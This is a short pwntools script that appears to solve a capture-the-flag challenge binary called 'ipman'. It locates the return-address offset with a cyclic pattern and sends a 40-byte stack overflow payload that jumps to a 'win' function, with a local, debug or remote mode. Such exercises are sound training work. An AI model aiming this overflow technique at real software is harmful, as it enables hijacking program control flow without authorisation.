from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./ipman"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b main
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    offset = 40
    log.info("binary loaded")
    pp.recvuntil(b":")
    payload = flat(
        b"A" * offset, 
        elf.sym.win
            )
    pp.sendline(payload)
    pp.interactive()

# libc = ELF("./libc.so.6")
libc = ELF("/usr/lib/libc.so.6")
elf = context.binary = ELF(binary)
pp = init()
exploit()
